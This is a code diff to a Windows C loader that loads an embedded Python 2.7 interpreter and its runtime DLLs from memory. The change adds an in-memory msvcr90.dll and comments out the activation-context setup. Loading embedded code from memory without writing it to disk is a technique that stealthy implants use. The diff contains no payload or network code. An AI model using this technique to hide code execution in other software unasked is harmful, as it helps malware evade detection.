@@ -17,6 +17,8 @@ extern const char resources_python27_dll_start[];
 extern const int resources_python27_dll_size;
 extern const char resources_bootloader_pyc_start[];
 extern const int resources_bootloader_pyc_size;
+extern const char resources_msvcr90_dll_start[];
+extern const int resources_msvcr90_dll_size;
 extern const char resource_python_manifest[];
 
 extern DL_EXPORT(void) init_memimporter(void);
@@ -41,19 +43,22 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	char * ppath;
 	FILE * f;
 	char tmp_python_dll_path[MAX_PATH];
-	char tmp_manifest_path[MAX_PATH];
+	//char tmp_manifest_path[MAX_PATH];
 	char tmp_path[MAX_PATH];
 	ACTCTX ctx;
 	BOOL activated;
 	HANDLE k32;
-	HANDLE (WINAPI *CreateActCtx)(PACTCTX pActCtx);
-	BOOL (WINAPI *ActivateActCtx)(HANDLE hActCtx, ULONG_PTR *lpCookie);
-	void (WINAPI *AddRefActCtx)(HANDLE hActCtx);
-	BOOL (WINAPI *DeactivateActCtx)(DWORD dwFlags, ULONG_PTR ulCookie);
+	//HANDLE (WINAPI *CreateActCtx)(PACTCTX pActCtx);
+	//BOOL (WINAPI *ActivateActCtx)(HANDLE hActCtx, ULONG_PTR *lpCookie);
+	//void (WINAPI *AddRefActCtx)(HANDLE hActCtx);
+	//BOOL (WINAPI *DeactivateActCtx)(DWORD dwFlags, ULONG_PTR ulCookie);
 	PyGILState_STATE restore_state;
 
-	//InitializeCriticalSection(&csInit);
+	_load_python("msvcr90.dll", resources_msvcr90_dll_start); // needed for the python interpreter
 
+	GetTempPath(MAX_PATH, tmp_path);
+	//InitializeCriticalSection(&csInit);
+	/*
 	k32 = LoadLibrary("kernel32");
 	CreateActCtx = (void*)GetProcAddress(k32, "CreateActCtxA");
 	ActivateActCtx = (void*)GetProcAddress(k32, "ActivateActCtx");
@@ -66,7 +71,6 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 		return 0;
 	}
 
-	GetTempPath(MAX_PATH, tmp_path);
 	ZeroMemory(&ctx, sizeof(ctx));
 	ctx.cbSize = sizeof(ACTCTX);
 	GetTempFileName(tmp_path, "tmp", 0, tmp_manifest_path);
@@ -88,12 +92,12 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	#ifndef QUIET
 	DeleteFile(tmp_manifest_path);
 	#endif
-
+	*/
 
 	if(!Py_IsInitialized)
 	{
 		int res=0;
-		activated = ActivateActCtx(MyActCtx, &actToken);
+		//activated = ActivateActCtx(MyActCtx, &actToken);
 		if(!_load_python("python27.dll", resources_python27_dll_start)){
 			
 			#ifndef QUIET
@@ -177,11 +181,13 @@ DWORD WINAPI mainThread(LPVOID lpArg)
 	//if (PyErr_Occurred())
 	//   PyErr_Print();
 	Py_Finalize();
+	/*
 	if (!DeactivateActCtx(0, actToken)){
 	#ifndef QUIET
 		printf("LOADER: Error deactivating context!\n!");
 	#endif
 	}
+	*/
 	//DeleteCriticalSection(&csInit);
 
 	return 0;
